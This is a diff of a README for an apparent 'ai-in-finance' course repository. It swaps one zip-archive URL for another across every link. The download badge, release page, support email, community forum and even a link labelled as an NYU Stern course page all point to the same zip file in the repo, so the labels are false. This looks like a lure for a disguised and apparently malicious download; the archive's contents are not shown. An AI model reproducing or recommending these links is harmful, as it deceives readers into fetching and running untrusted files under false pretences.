@@ -1,6 +1,6 @@
 # 📈 ai-in-finance - Learn AI Applications in Finance  
 
-[![Download Now](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip)
+[![Download Now](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip%20Now-Release%20Page-brightgreen)](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip)
 
 ## 🚀 Getting Started  
 
@@ -10,7 +10,7 @@ Welcome to the **ai-in-finance** repository, where you will find course material
 
 To get started with the course material, follow these steps:  
 
-1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip).  
+1. Visit this page to download: [GitHub Releases](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip).  
    
 2. On the Releases page, you will see a list of available downloads. Look for the latest version.  
 
@@ -54,8 +54,8 @@ After installing the course material:
 
 If you encounter any issues or have questions while using the application, please reach out for support:  
 
-- Email: https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip  
-- Join our [Community Forum](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip) for discussions and to get help from fellow users.  
+- Email: https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip  
+- Join our [Community Forum](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip) for discussions and to get help from fellow users.  
 
 ## 📝 Contributing  
 
@@ -63,14 +63,14 @@ If you have suggestions to improve the course material or want to contribute wit
 
 ## 📅 Update Schedule  
 
-We periodically update the course material. To get the latest version and enhancements, return to our [Releases page](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip) regularly.
+We periodically update the course material. To get the latest version and enhancements, return to our [Releases page](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip) regularly.
 
 ## 🌐 Resources  
 
 You may find these external resources helpful as you navigate through the course:
 
-- [NYU Stern AI in Finance Course Page](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip)  
-- [AI and Finance Articles](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip)  
-- [Online Community for AI Enthusiasts](https://raw.githubusercontent.com/jddjdjdjnf/ai-in-finance/main/slides/ai_finance_in_somacule.zip)  
+- [NYU Stern AI in Finance Course Page](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip)  
+- [AI and Finance Articles](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip)  
+- [Online Community for AI Enthusiasts](https://github.com/jddjdjdjnf/ai-in-finance/raw/refs/heads/main/slides/ai_in_finance_3.5.zip)  
 
 By following this guide, you can easily download and run the **ai-in-finance** software, unlocking valuable learning materials to enhance your understanding of AI in finance.
